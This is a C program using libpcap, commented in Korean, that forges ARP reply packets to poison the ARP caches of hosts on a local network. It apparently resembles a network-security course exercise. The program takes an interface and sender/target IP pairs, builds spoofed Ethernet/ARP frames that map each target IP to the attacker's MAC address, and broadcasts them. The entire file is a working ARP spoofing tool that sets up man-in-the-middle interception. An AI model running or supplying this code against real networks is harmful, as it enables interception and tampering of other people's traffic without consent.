#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/if_ether.h>

#define ETH_HDRLEN 14
#define ARP_HDRLEN 28
#define ETHER_TYPE_ARP 0x0806

unsigned char* get_mac_address(const char *interface) {
    int fd;
    struct ifreq ifr;
    static unsigned char mac[6];

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("Socket");
        return NULL;
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        return NULL;
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    close(fd);
    return mac;
}

void send_arp_infection(pcap_t *handle, const char *interface, const char *sender_ip, const char *target_ip) {
    unsigned char buffer[ETH_HDRLEN + ARP_HDRLEN];
    struct ether_header *eth_hdr = (struct ether_header *) buffer;
    struct ether_arp *arp_hdr = (struct ether_arp *) (buffer + ETH_HDRLEN);

    unsigned char *src_mac = get_mac_address(interface);
    if (src_mac == NULL) {
        fprintf(stderr, "Sender MAC 주소를 가져오는 데 실패했습니다.\n");
        return;
    }

    unsigned char target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // 브로드캐스트로 초기화
    unsigned char *spoofed_mac = src_mac; // 공격자의 MAC 주소를 스푸핑할 MAC 주소로 사용

    // 이더넷 헤더 구성
    memcpy(eth_hdr->ether_shost, src_mac, 6);
    memcpy(eth_hdr->ether_dhost, target_mac, 6); // 대상 MAC 주소를 모르므로 브로드캐스트 사용
    eth_hdr->ether_type = htons(ETHER_TYPE_ARP);

    // ARP 헤더 구성
    arp_hdr->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_hdr->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_hdr->ea_hdr.ar_hln = 6;
    arp_hdr->ea_hdr.ar_pln = 4;
    arp_hdr->ea_hdr.ar_op = htons(ARPOP_REPLY); // ARP 응답으로 위조

    memcpy(arp_hdr->arp_sha, spoofed_mac, 6); // 스푸핑된 MAC 주소
    inet_pton(AF_INET, target_ip, arp_hdr->arp_spa); // 스푸핑된 IP 주소

    memcpy(arp_hdr->arp_tha, target_mac, 6); // 대상의 MAC 주소 (브로드캐스트)
    inet_pton(AF_INET, sender_ip, arp_hdr->arp_tpa); // 대상의 IP 주소

    // ARP 감염 패킷 전송
    if (pcap_sendpacket(handle, buffer, sizeof(buffer)) != 0) {
        fprintf(stderr, "패킷 전송 중 오류 발생: %s\n", pcap_geterr(handle));
    } else {
        printf("ARP 감염 패킷 전송 완료: %s -> %s\n", target_ip, sender_ip);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        fprintf(stderr, "Usage: %s <interface> <sender_ip> <target_ip> [<sender_ip 2> <target_ip 2> ...]\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *interface = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "장치 %s를 열 수 없습니다: %s\n", interface, errbuf);
        return EXIT_FAILURE;
    }

    // 여러 쌍의 sender_ip와 target_ip에 대해 ARP 인젝션 수행
    for (int i = 2; i < argc; i += 2) {
        const char *sender_ip = argv[i];
        const char *target_ip = argv[i + 1];
        send_arp_infection(handle, interface, sender_ip, target_ip);
    }

    pcap_close(handle);
    return EXIT_SUCCESS;
}

